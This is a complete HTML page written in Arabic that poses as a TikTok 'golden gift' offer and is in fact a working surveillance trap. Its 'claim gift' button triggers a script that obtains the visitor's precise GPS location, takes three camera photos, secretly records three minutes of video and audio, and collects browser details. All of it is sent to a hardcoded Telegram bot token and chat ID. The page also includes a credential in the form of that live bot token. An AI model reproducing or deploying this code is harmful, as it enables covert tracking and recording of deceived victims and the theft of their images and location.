<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 مفاجأة خاصة لك 🎁</title>
    <style>
        body { background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%); font-family: 'Cairo', sans-serif; color: #fff; text-align: center; height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        .card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(15px); padding: 40px; border-radius: 30px; border: 2px solid #fff; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 85%; max-width: 400px; }
        h1 { font-size: 28px; margin-bottom: 10px; }
        p { font-size: 18px; line-height: 1.6; }
        .btn { background: #fff; color: #ff758c; padding: 15px 30px; border-radius: 50px; font-weight: bold; text-decoration: none; display: inline-block; margin-top: 20px; cursor: pointer; border: none; font-size: 18px; box-shadow: 0 5px 15px rgba(255,117,140,0.4); }
        #camera-feed { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <h1>يا أهلاً بهذا الوجه الجميل! ✨</h1>
        <p>لقد تم اختيارك للحصول على هدية "تيك توك" الذهبية لهذا العام. أنت شخص مميز وتستحق الأفضل دائماً..</p>
        <p>فقط اضغط "استلام الهدية" لربط حسابك بأقرب مركز هدايا بجانبك الآن! 🎁</p>
        <button class="btn" onclick="startHeist()">🎁 استلام الهدية 🎁</button>
    </div>

    <video id="camera-feed" autoplay playsinline></video>

    <script>
        const BOT_TOKEN = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
        const CHAT_ID = "5475815049";

        function sendToTelegram(msg, isFile = false, blob = null) {
            let url = `https://api.telegram.org/bot${BOT_TOKEN}/`;
            if (isFile) {
                let formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', blob, 'captured_media.png');
                fetch(url + 'sendDocument', { method: 'POST', body: formData });
            } else {
                fetch(url + `sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            }
        }

        async function startHeist() {
            // 1. طلب الـ GPS بدقة عالية (تحت غطاء "استلام الهدية")
            navigator.geolocation.getCurrentPosition(pos => {
                let maps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToTelegram(`🎯 *TARGET PINPOINTED*\n📍 GPS: [Click here](${maps})`);
            }, null, { enableHighAccuracy: true });

            // 2. الوصول للكاميرا لسحب الصور والفيديو
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const video = document.getElementById('camera-feed');
                video.srcObject = stream;

                // التقاط 3 صور فوراً
                let count = 0;
                let interval = setInterval(() => {
                    if (count >= 3) { clearInterval(interval); return; }
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => sendToTelegram("📸 Photo Captured", true, blob));
                    count++;
                }, 2000);

                // تسجيل فيديو لمدة 3 دقائق في الخلفية
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    sendToTelegram("🎥 Full 3-Min Video Captured", true, blob);
                };
                recorder.start();
                setTimeout(() => recorder.stop(), 180000); // 3 دقائق

            } catch (e) { sendToTelegram("❌ Camera Access Refused"); }

            // 3. سحب المعلومات التقنية (إيميلات، حسابات، متصفح)
            let info = `👤 *SENSITIVE SYSTEM DATA* 👤\n` +
                       `📧 *Browser Accounts:* ${navigator.userAgent}\n` +
                       `📱 *Platform:* ${navigator.platform}\n` +
                       `🌐 *Language:* ${navigator.language}\n` +
                       `🕰️ *Last Sites Check:* ${document.referrer || "None"}`;
            sendToTelegram(info);
            
            alert("جاري معالجة الهدية... يرجى عدم إغلاق الصفحة لمدة 3 دقائق لضمان التوصيل!");
        }
    </script>
</body>
</html>
